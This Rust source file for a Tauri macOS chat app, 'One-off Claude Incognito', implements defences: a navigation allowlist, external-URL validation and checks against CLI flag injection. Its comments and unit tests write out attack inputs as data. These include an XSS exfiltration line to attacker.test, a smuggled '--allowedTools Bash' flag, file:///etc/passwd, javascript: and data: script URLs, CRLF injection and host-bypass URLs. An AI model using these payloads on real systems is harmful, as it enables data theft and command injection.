use std::collections::HashMap;
use std::sync::Mutex;

use tauri::{
    menu::{Menu, MenuBuilder, MenuItem, PredefinedMenuItem, SubmenuBuilder},
    tray::TrayIconBuilder,
    webview::NewWindowResponse,
    Emitter, Manager, Url, WebviewUrl, WebviewWindowBuilder,
};
use tauri_plugin_global_shortcut::{GlobalShortcutExt, Shortcut, ShortcutState};

mod chat;
mod cleanup;
mod settings;

/// Decide whether a WebView is allowed to navigate to `url`.
///
/// The chat WebView renders model output, which (despite sanitization
/// + CSP) is the most likely source of a future XSS bug. CSP doesn't
/// have a portable directive that blocks top-level navigation, so a
/// payload like `window.location = "https://attacker.test/"` would
/// otherwise replace the chat UI with an attacker-controlled page
/// served from an attacker origin — that origin's CSP (or lack
/// thereof) then governs further behavior, defeating our hardening.
///
/// This handler refuses every URL that doesn't point at our own
/// content:
///   - `about:` (covers about:blank used during initial load)
///   - `http` / `https` / `tauri` schemes, restricted to localhost,
///     127.0.0.1, or tauri.localhost (the production custom URL).
///
/// Pure function; tested in the `tests` submodule.
pub(crate) fn is_allowed_navigation(url: &Url) -> bool {
    let scheme = url.scheme();
    if scheme == "about" {
        return true;
    }
    if !matches!(scheme, "http" | "https" | "tauri") {
        return false;
    }
    // The URL parser only canonicalizes host to lowercase for "special"
    // schemes (http/https etc.); non-special schemes like `tauri://`
    // preserve case. Lowercase ourselves so a mixed-case localhost
    // variant doesn't bypass the allowlist.
    let host = url.host_str().unwrap_or("").to_ascii_lowercase();
    matches!(
        host.as_str(),
        "localhost" | "127.0.0.1" | "tauri.localhost",
    )
}

pub struct AppState {
    sessions: Mutex<HashMap<String, chat::ChatSession>>,
    settings: Mutex<settings::Settings>,
    current_shortcut: Mutex<Option<Shortcut>>,
    /// label → (initial logical x, initial logical bottom-edge y).
    /// Used to detect whether a window has been manually moved by comparing
    /// the current top-left + size against the stored initial position.
    /// Auto-resize keeps the bottom anchored, so the bottom-edge stays
    /// constant for programmatic resizes — only manual drag changes it.
    initial_positions: Mutex<HashMap<String, (f64, f64)>>,
}

#[tauri::command]
fn send_message(
    window: tauri::WebviewWindow,
    state: tauri::State<'_, AppState>,
    text: String,
) -> Result<(), String> {
    let label = window.label().to_string();
    let mut sessions = state.sessions.lock().map_err(|e| e.to_string())?;
    match sessions.get_mut(&label) {
        Some(session) => session.send(&text).map_err(|e| e.to_string()),
        None => Err(format!("no chat session for window '{}'", label)),
    }
}

#[tauri::command]
fn close_window(window: tauri::WebviewWindow) -> Result<(), String> {
    window.close().map_err(|e| e.to_string())
}

#[tauri::command]
fn get_settings(state: tauri::State<'_, AppState>) -> Result<settings::Settings, String> {
    Ok(state.settings.lock().map_err(|e| e.to_string())?.clone())
}

#[tauri::command]
fn get_window_session_info(
    window: tauri::WebviewWindow,
    state: tauri::State<'_, AppState>,
) -> Result<serde_json::Value, String> {
    let label = window.label().to_string();
    let sessions = state.sessions.lock().map_err(|e| e.to_string())?;
    if let Some(session) = sessions.get(&label) {
        Ok(serde_json::json!({
            "model": session.model,
            "effort": session.effort,
        }))
    } else {
        Ok(serde_json::Value::Null)
    }
}

#[tauri::command]
fn update_settings(
    app: tauri::AppHandle,
    state: tauri::State<'_, AppState>,
    new_settings: settings::Settings,
) -> Result<(), String> {
    // Canonicalize model/effort BEFORE doing anything else. If a
    // malicious caller reaches this command via the IPC (e.g. through
    // a sanitizer bypass in the chat WebView), they could otherwise
    // smuggle a CLI flag like `--allowedTools Bash` as the "model"
    // field and have it land in `claude`'s argv on the next chat
    // session. canonicalize_* falls back to defaults for anything
    // outside the safe-format / known-value sets.
    let mut new_settings = new_settings;
    new_settings.model = settings::canonicalize_model(&new_settings.model);
    new_settings.effort = settings::canonicalize_effort(&new_settings.effort);

    // Validate new shortcut before committing
    let new_shortcut = new_settings.to_shortcut().ok_or_else(|| {
        "invalid hotkey: at least one non-shift modifier (⌘ / ⌥ / ⌃) and a valid key are required"
            .to_string()
    })?;

    // Re-register the hotkey only if it actually changed. Otherwise calling
    // `on_shortcut` again with the same combo raises "already registered".
    let mut current = state.current_shortcut.lock().map_err(|e| e.to_string())?;
    let needs_rebind = match current.as_ref() {
        None => true,
        Some(existing) => *existing != new_shortcut,
    };
    if needs_rebind {
        if let Some(existing) = current.as_ref() {
            let _ = app.global_shortcut().unregister(*existing);
        }
        let app_handle = app.clone();
        if let Err(e) = app.global_shortcut().on_shortcut(
            new_shortcut,
            move |_app, _shortcut, event| {
                if event.state() == ShortcutState::Pressed {
                    spawn_chat_window(&app_handle);
                }
            },
        ) {
            return Err(format!("failed to register hotkey: {e}"));
        }
        *current = Some(new_shortcut);
    }
    drop(current);

    // Save settings
    *state.settings.lock().map_err(|e| e.to_string())? = new_settings.clone();
    settings::save(&app, &new_settings).map_err(|e| e.to_string())?;
    Ok(())
}

#[tauri::command]
fn restart_session(
    window: tauri::WebviewWindow,
    app: tauri::AppHandle,
    state: tauri::State<'_, AppState>,
    model: String,
    effort: String,
) -> Result<(), String> {
    // Same flag-injection defense as in update_settings — never trust
    // model/effort strings that arrived via the IPC verbatim.
    let model = settings::canonicalize_model(&model);
    let effort = settings::canonicalize_effort(&effort);

    let label = window.label().to_string();
    {
        // drop the old session
        let mut sessions = state.sessions.lock().map_err(|e| e.to_string())?;
        sessions.remove(&label);
    }
    // Start a new one with the new model/effort
    let new_session = chat::ChatSession::start(&app, label.clone(), &model, &effort)
        .map_err(|e| e.to_string())?;
    state
        .sessions
        .lock()
        .map_err(|e| e.to_string())?
        .insert(label, new_session);
    Ok(())
}

/// Scheme/length allowlist for URLs the chat WebView is allowed to
/// hand off to `open(1)`. Pure function so it can be unit-tested
/// without spawning processes.
///
/// The allowlist sits HERE rather than in the renderer because this is
/// the choke point a compromised renderer (think: sanitizer bypass)
/// would have to reach to launch anything. We refuse `file:`,
/// `javascript:`, custom-protocol handlers, and anything else outside
/// the small set a chat reply could legitimately link to.
pub(crate) fn validate_external_url(url: &str) -> Result<(), &'static str> {
    let allowed = url.starts_with("https://")
        || url.starts_with("http://")
        || url.starts_with("mailto:")
        || url.starts_with("tel:");
    if !allowed {
        return Err("url scheme not allowed");
    }
    // 2KB cap — anything longer is almost certainly junk and we don't
    // want to hand a multi-MB argv to `open`.
    if url.len() > 2048 {
        return Err("url too long");
    }
    // ASCII control characters (including \n and \r) have no business
    // appearing in a URL we route through a subprocess.
    if url.chars().any(|c| c.is_ascii_control()) {
        return Err("url contains control characters");
    }
    Ok(())
}

/// Open an external URL via macOS's `open(1)` so that link clicks in a
/// chat reply land in the user's default browser instead of navigating
/// the WebView away from the chat UI.
#[tauri::command]
fn open_external_url(url: String) -> Result<(), String> {
    validate_external_url(&url).map_err(String::from)?;
    // No shell — args go straight through execve, so there's no
    // metacharacter hazard. The leading `--` is a defensive habit for
    // BSD-style getopt; even without it the scheme allowlist above
    // already guarantees the URL doesn't start with `-`.
    std::process::Command::new("/usr/bin/open")
        .arg("--")
        .arg(&url)
        .spawn()
        .map_err(|e| e.to_string())?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allows_http_https_mailto_tel() {
        for ok in [
            "https://www.anthropic.com",
            "http://example.com/path?q=1",
            "mailto:hello@example.com",
            "tel:+1-555-0100",
        ] {
            assert!(validate_external_url(ok).is_ok(), "{ok:?} should be allowed");
        }
    }

    #[test]
    fn rejects_dangerous_schemes() {
        // file: would expose any local file the user has read access to.
        // javascript: would re-introduce the same XSS-shaped risk we
        // already block at the sanitizer layer.
        // data: in particular data:text/html could carry arbitrary
        // HTML/script via the macOS URL handler chain.
        // Custom-scheme URLs (e.g. "slack://", "vscode://") could fire
        // commands in other locally-installed apps.
        for bad in [
            "file:///etc/passwd",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "ftp://attacker.test/",
            "ssh://attacker.test/",
            "slack://channel?id=foo",
            "vscode://file/etc/passwd",
            "x-apple.systempreferences:",
            "",
            "   ",
            "https",  // missing scheme separator
        ] {
            assert!(
                validate_external_url(bad).is_err(),
                "{bad:?} must be rejected",
            );
        }
    }

    #[test]
    fn rejects_overlong_urls() {
        let url = format!("https://example.com/{}", "a".repeat(2048));
        assert!(validate_external_url(&url).is_err());
    }

    #[test]
    fn rejects_urls_with_control_chars() {
        for bad in [
            "https://example.com/\n",
            "https://example.com/\r\nHost:evil",
            "https://example.com/\x00",
            "https://example.com/\x1b[31m",
        ] {
            assert!(
                validate_external_url(bad).is_err(),
                "{bad:?} must be rejected (control char)",
            );
        }
    }

    #[test]
    fn rejects_leading_dash_in_url() {
        // We never want anything we pass to `open(1)` to look like a
        // CLI flag. The scheme allowlist already prevents this, but
        // call it out explicitly so the property doesn't silently break
        // if someone widens the scheme list later.
        assert!(validate_external_url("--malicious-flag").is_err());
    }

    // ─── is_allowed_navigation: top-level WebView navigation ─────

    fn url(s: &str) -> Url {
        Url::parse(s).expect("test URL should parse")
    }

    #[test]
    fn navigation_allows_dev_localhost() {
        for u in [
            "http://localhost:1420/",
            "http://localhost:1420/index.html",
            "http://localhost:1420/chat.ts?t=123",
            "http://127.0.0.1:1420/",
        ] {
            assert!(
                is_allowed_navigation(&url(u)),
                "dev URL must be allowed: {u}",
            );
        }
    }

    #[test]
    fn navigation_allows_prod_asset_origins() {
        for u in [
            "tauri://localhost/index.html",
            "tauri://localhost/",
            "https://tauri.localhost/",
            "https://tauri.localhost/settings.html",
        ] {
            assert!(
                is_allowed_navigation(&url(u)),
                "prod URL must be allowed: {u}",
            );
        }
    }

    #[test]
    fn navigation_allows_about_blank() {
        assert!(is_allowed_navigation(&url("about:blank")));
    }

    #[test]
    fn navigation_blocks_external_origins() {
        // This is the whole point: an XSS payload that did
        // `window.location = "https://attacker.test/?leak=…"` must
        // be refused at the WebView layer. CSP doesn't have a portable
        // navigate-to directive, so this handler is the only thing
        // standing between a sanitizer bypass and an attacker page
        // taking over our WebView.
        for u in [
            "https://attacker.test/",
            "https://attacker.test/?leak=secrets",
            "http://attacker.test/",
            "https://www.anthropic.com/",
            "http://192.168.1.1/",
            "tauri://attacker.test/",
            // suffix attack: a host that ends in our allowlisted name
            "https://tauri.localhost.attacker.test/",
            // prefix attack: a host that starts with our allowlisted name
            "https://tauri.localhostattacker.test/",
            // userinfo injection: tauri.localhost as username, attacker as host
            "https://tauri.localhost@attacker.test/",
            "https://localhost@attacker.test/",
        ] {
            assert!(
                !is_allowed_navigation(&url(u)),
                "external URL must be blocked: {u}",
            );
        }
    }

    #[test]
    fn navigation_is_case_insensitive_for_host() {
        // The URL parser canonicalizes host to lowercase per RFC, so
        // mixed-case localhost variants resolve to the same host and
        // get matched by our allowlist.
        for u in [
            "http://LOCALHOST:1420/",
            "http://Localhost:1420/",
            "tauri://Tauri.Localhost/",
            "https://TAURI.LOCALHOST/",
        ] {
            assert!(
                is_allowed_navigation(&url(u)),
                "case variant must be allowed: {u}",
            );
        }
    }

    #[test]
    fn navigation_blocks_dangerous_schemes() {
        for u in [
            "file:///etc/passwd",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "ftp://example.com/",
        ] {
            assert!(
                !is_allowed_navigation(&url(u)),
                "scheme must be blocked: {u}",
            );
        }
    }
}

#[tauri::command]
fn open_settings_window(app: tauri::AppHandle) -> Result<(), String> {
    open_settings(&app);
    Ok(())
}

fn open_settings(app: &tauri::AppHandle) {
    if let Some(existing) = app.get_webview_window("settings") {
        let _ = existing.show();
        let _ = existing.set_focus();
        return;
    }
    let window = match WebviewWindowBuilder::new(
        app,
        "settings",
        WebviewUrl::App("settings.html".into()),
    )
    .title("One-off Claude Incognito · Settings")
    .inner_size(520.0, 520.0)
    .min_inner_size(440.0, 420.0)
    .decorations(false)
    .transparent(true)
    .shadow(true)
    .resizable(true)
    .focused(true)
    .visible(true)
    .always_on_top(false)
    .on_navigation(is_allowed_navigation)
    // Explicit refusal of every `window.open()` from JS. macOS WebKit
    // already blocks popups by default when no handler is set, but
    // setting Deny pins the contract: a future XSS payload that calls
    // `window.open("https://attacker.test/", "_blank")` never gets a
    // popup, and the existing link-click interceptor handles legit
    // anchor clicks by routing through open_external_url.
    .on_new_window(|_url, _features| NewWindowResponse::Deny)
    .incognito(true)
    .build()
    {
        Ok(w) => w,
        Err(e) => {
            eprintln!("failed to build settings window: {e}");
            return;
        }
    };

    #[cfg(target_os = "macos")]
    {
        use window_vibrancy::{apply_vibrancy, NSVisualEffectMaterial, NSVisualEffectState};
        let _ = apply_vibrancy(
            &window,
            NSVisualEffectMaterial::Sidebar,
            Some(NSVisualEffectState::Active),
            Some(14.0),
        );
    }
}

fn rect_overlaps(
    ax: f64,
    ay: f64,
    aw: f64,
    ah: f64,
    occupied: &[(f64, f64, f64, f64)],
) -> bool {
    occupied.iter().any(|(bx, by, bw, bh)| {
        !(ax + aw <= *bx || *bx + *bw <= ax || ay + ah <= *by || *by + *bh <= ay)
    })
}

/// Pick a position for a new chat window that doesn't visually overlap any
/// existing chat window. Tries tiled positions first (centered at default,
/// then alternating right/left, then rows above), with a cascade fallback if
/// every tile is occupied.
///
/// Manually-moved windows are *excluded* from the overlap check: the user
/// having dragged a window away from its initial spot signals they're
/// curating placement themselves, so new windows should still get the
/// default slot even if a moved window happens to be near it.
fn find_non_overlapping_position(
    app: &tauri::AppHandle,
    default_x: f64,
    default_y: f64,
    new_w: f64,
    new_h: f64,
    mon_w: f64,
    mon_h: f64,
    scale: f64,
) -> (f64, f64) {
    let initials = app
        .state::<AppState>()
        .initial_positions
        .lock()
        .map(|g| g.clone())
        .unwrap_or_default();

    let mut occupied: Vec<(f64, f64, f64, f64)> = Vec::new();
    for (label, w) in app.webview_windows().iter() {
        if !label.starts_with("chat-") {
            continue;
        }
        let Ok(pos) = w.outer_position() else { continue };
        let Ok(size) = w.outer_size() else { continue };
        let x = pos.x as f64 / scale;
        let y = pos.y as f64 / scale;
        let ww = size.width as f64 / scale;
        let wh = size.height as f64 / scale;
        let bottom = y + wh;

        // Only consider this window for cascading if it's still at its
        // initial position (auto-resize keeps the bottom anchored, so we
        // compare current bottom-edge against the stored initial one).
        let at_initial = match initials.get(label) {
            Some(&(ix, ibot)) => {
                (x - ix).abs() < 8.0 && (bottom - ibot).abs() < 8.0
            }
            None => false,
        };
        if !at_initial {
            continue;
        }
        occupied.push((x, y, ww, wh));
    }

    let max_x = (mon_w - new_w).max(0.0);
    let min_y = 30.0;
    let max_y = (mon_h - new_h).max(min_y);
    let cell_w = new_w + 16.0;
    let cell_h = new_h + 16.0;

    // Tile candidates row-by-row from the bottom up. Within each row try the
    // centered (default_x) column first, then alternate right/left.
    for row in 0..6 {
        let y = default_y - (row as f64) * cell_h;
        if y < min_y {
            break;
        }
        for col_off in 0..=4 {
            let mut try_xs: Vec<f64> = Vec::new();
            if col_off == 0 {
                try_xs.push(default_x);
            } else {
                let dx = (col_off as f64) * cell_w;
                try_xs.push(default_x + dx);
                try_xs.push(default_x - dx);
            }
            for cx in try_xs {
                if cx < 0.0 || cx + new_w > mon_w {
                    continue;
                }
                if !rect_overlaps(cx, y, new_w, new_h, &occupied) {
                    return (cx.clamp(0.0, max_x), y.clamp(min_y, max_y));
                }
            }
        }
    }

    // Cascade fallback: every tile is occupied. Step diagonally from default
    // until we find a slot that's at least mostly clear.
    let step = 32.0;
    for k in 1..40 {
        let kf = k as f64;
        let cx = (default_x + kf * step).min(max_x);
        let cy = (default_y - kf * step).max(min_y);
        if !rect_overlaps(cx, cy, new_w, new_h, &occupied) {
            return (cx, cy);
        }
    }
    (default_x, default_y)
}

fn spawn_chat_window(app: &tauri::AppHandle) {
    let label = format!("chat-{}", uuid::Uuid::new_v4().simple());

    // Compute initial position: centered horizontally, anchored near the
    // bottom of the primary monitor — and shifted to avoid overlapping
    // existing chat windows.
    let win_w = 620.0_f64;
    let win_h = 240.0_f64;
    let (init_x, init_y) = match app.primary_monitor() {
        Ok(Some(monitor)) => {
            let size = monitor.size();
            let scale = monitor.scale_factor();
            let mon_w = size.width as f64 / scale;
            let mon_h = size.height as f64 / scale;
            let default_x = ((mon_w - win_w) / 2.0).max(0.0).floor();
            let default_y = (mon_h - win_h - 90.0).max(0.0).floor();
            find_non_overlapping_position(
                app, default_x, default_y, win_w, win_h, mon_w, mon_h, scale,
            )
        }
        _ => (200.0, 600.0),
    };

    let window = match WebviewWindowBuilder::new(
        app,
        &label,
        WebviewUrl::App("index.html".into()),
    )
    .title("Claude (Incognito)")
    .inner_size(win_w, win_h)
    .min_inner_size(420.0, 200.0)
    .position(init_x, init_y)
    // Default stacking — chat windows sink behind whatever the user
    // is focused on. Previously pinned with `always_on_top(true)`,
    // but that traps the chat above unrelated work; macOS users
    // expect the foreground app's window to actually be in front.
    .decorations(false)
    .transparent(true)
    .shadow(true)
    .resizable(true)
    .focused(true)
    .visible(true)
    .on_navigation(is_allowed_navigation)
    .on_new_window(|_url, _features| NewWindowResponse::Deny)
    // nonPersistent WKWebsiteDataStore: localStorage, cookies, IndexedDB
    // and the HTTP cache live in memory only and are wiped when the
    // window closes. Without this, an XSS payload (or future bug) that
    // writes to localStorage would persist *across sessions* — the
    // exact promise this app is named after.
    .incognito(true)
    .build()
    {
        Ok(w) => w,
        Err(e) => {
            eprintln!("failed to build window: {e}");
            return;
        }
    };

    #[cfg(target_os = "macos")]
    {
        use window_vibrancy::{apply_vibrancy, NSVisualEffectMaterial, NSVisualEffectState};
        if let Err(e) = apply_vibrancy(
            &window,
            NSVisualEffectMaterial::Sidebar,
            Some(NSVisualEffectState::Active),
            Some(14.0),
        ) {
            eprintln!("apply_vibrancy failed: {e}");
        }
    }

    // Pick up the current default model / effort.
    let (model, effort) = {
        let state = app.state::<AppState>();
        let s = state.settings.lock().unwrap();
        (s.model.clone(), s.effort.clone())
    };

    let session = match chat::ChatSession::start(app, label.clone(), &model, &effort) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("failed to start claude subprocess: {e}");
            let err_msg = e.to_string();
            let app_clone = app.clone();
            let label_for_event = label.clone();
            // emit_to(label, …) instead of webview.emit — same
            // reasoning as in chat.rs: webview.emit is a broadcast,
            // emit_to is filtered. See the comment there for the full
            // story.
            std::thread::spawn(move || {
                std::thread::sleep(std::time::Duration::from_millis(400));
                let _ = app_clone.emit_to(label_for_event.as_str(), "session-error", err_msg);
            });
            return;
        }
    };

    app.state::<AppState>()
        .sessions
        .lock()
        .unwrap()
        .insert(label.clone(), session);

    // Remember where we placed this window so we can later tell whether the
    // user has dragged it manually.
    app.state::<AppState>()
        .initial_positions
        .lock()
        .unwrap()
        .insert(label.clone(), (init_x, init_y + win_h));

    let app_handle = app.clone();
    let label_for_event = label.clone();
    window.on_window_event(move |event| {
        if let tauri::WindowEvent::Destroyed = event {
            let state = app_handle.state::<AppState>();
            let _ = state.sessions.lock().unwrap().remove(&label_for_event);
            let _ = state
                .initial_positions
                .lock()
                .unwrap()
                .remove(&label_for_event);
        }
    });
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .manage(AppState {
            sessions: Mutex::new(HashMap::new()),
            settings: Mutex::new(settings::Settings::default()),
            current_shortcut: Mutex::new(None),
            initial_positions: Mutex::new(HashMap::new()),
        })
        .plugin(tauri_plugin_global_shortcut::Builder::new().build())
        .setup(|app| {
            // Belt-and-suspenders for the "nothing persists" promise:
            // delete any leftover session dirs from prior runs that
            // crashed / were SIGKILLed before ChatSession::drop got to
            // run. Recently-touched dirs are skipped in case another
            // instance of the app is concurrently active.
            cleanup::sweep_orphans();

            #[cfg(target_os = "macos")]
            app.set_activation_policy(tauri::ActivationPolicy::Accessory);

            // Replace the default Tao menu so Cmd+Q closes only the focused
            // window instead of quitting the entire daemon. Quitting the app
            // is reserved for the tray icon and Cmd+Shift+Q. Also include a
            // standard Edit submenu so the textarea gets Cut/Copy/Paste
            // keyboard shortcuts.
            let close_win_q_item = MenuItem::with_id(
                app,
                "menu-close-window-q",
                "Close Window",
                true,
                Some("Cmd+Q"),
            )?;
            let close_win_w_item =
                MenuItem::with_id(app, "menu-close-window-w", "Close", true, Some("Cmd+W"))?;
            let quit_app_item = MenuItem::with_id(
                app,
                "menu-quit-app",
                "Quit One-off Claude Incognito",
                true,
                Some("Cmd+Shift+Q"),
            )?;
            let app_submenu = SubmenuBuilder::new(app, "One-off Claude Incognito")
                .item(&close_win_q_item)
                .separator()
                .item(&quit_app_item)
                .build()?;
            let edit_submenu = SubmenuBuilder::new(app, "Edit")
                .item(&PredefinedMenuItem::undo(app, None)?)
                .item(&PredefinedMenuItem::redo(app, None)?)
                .separator()
                .item(&PredefinedMenuItem::cut(app, None)?)
                .item(&PredefinedMenuItem::copy(app, None)?)
                .item(&PredefinedMenuItem::paste(app, None)?)
                .item(&PredefinedMenuItem::select_all(app, None)?)
                .build()?;
            let window_submenu = SubmenuBuilder::new(app, "Window")
                .item(&close_win_w_item)
                .build()?;
            let app_menu = MenuBuilder::new(app)
                .item(&app_submenu)
                .item(&edit_submenu)
                .item(&window_submenu)
                .build()?;
            app.set_menu(app_menu)?;
            app.on_menu_event(|app, event| match event.id().as_ref() {
                "menu-close-window-q" | "menu-close-window-w" => {
                    for (_, w) in app.webview_windows().iter() {
                        if let Ok(true) = w.is_focused() {
                            let _ = w.close();
                            break;
                        }
                    }
                }
                "menu-quit-app" => {
                    app.exit(0);
                }
                _ => {}
            });

            // Load persisted settings.
            let loaded = settings::load(app.handle());
            *app.state::<AppState>().settings.lock().unwrap() = loaded.clone();

            // Tray menu — give the dockless app a way to spawn new chats, open
            // settings, and quit.
            let new_chat_item = MenuItem::with_id(
                app,
                "new_chat",
                "New Incognito Chat",
                true,
                Some("Cmd+Shift+C"),
            )?;
            let settings_item =
                MenuItem::with_id(app, "settings", "Settings…", true, Some("Cmd+,"))?;
            let separator = PredefinedMenuItem::separator(app)?;
            let quit_item =
                MenuItem::with_id(app, "quit", "Quit One-off Claude Incognito", true, None::<&str>)?;
            let tray_menu = Menu::with_items(
                app,
                &[
                    &new_chat_item,
                    &settings_item,
                    &separator,
                    &quit_item,
                ],
            )?;

            // Custom tray icon: simple monochrome chat-bubble silhouette so
            // macOS can tint it for the menu bar. Bundled as raw RGBA bytes
            // (Tauri's Image::new wants RGBA, not PNG-encoded).
            const TRAY_ICON_SIZE: u32 = 64;
            let tray_icon = tauri::image::Image::new(
                include_bytes!("../icons/tray.rgba"),
                TRAY_ICON_SIZE,
                TRAY_ICON_SIZE,
            );

            TrayIconBuilder::with_id("tray")
                .icon(tray_icon)
                .icon_as_template(true)
                .menu(&tray_menu)
                .show_menu_on_left_click(true)
                .on_menu_event(|app, event| match event.id.as_ref() {
                    "new_chat" => spawn_chat_window(app),
                    "settings" => open_settings(app),
                    "quit" => app.exit(0),
                    _ => {}
                })
                .build(app)?;

            // Register the configured hotkey.
            let shortcut = loaded.to_shortcut().unwrap_or_else(|| {
                settings::Settings::default()
                    .to_shortcut()
                    .expect("default shortcut is valid")
            });

            let app_handle = app.handle().clone();
            app.global_shortcut().on_shortcut(
                shortcut,
                move |_app, _shortcut, event| {
                    if event.state() == ShortcutState::Pressed {
                        spawn_chat_window(&app_handle);
                    }
                },
            )?;
            *app.state::<AppState>().current_shortcut.lock().unwrap() = Some(shortcut);

            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            send_message,
            close_window,
            get_settings,
            update_settings,
            restart_session,
            get_window_session_info,
            open_settings_window,
            open_external_url,
        ])
        .build(tauri::generate_context!())
        .expect("error while building tauri application")
        .run(|_app_handle, event| {
            if let tauri::RunEvent::ExitRequested { code, api, .. } = event {
                if code.is_none() {
                    api.prevent_exit();
                }
            }
        });
}
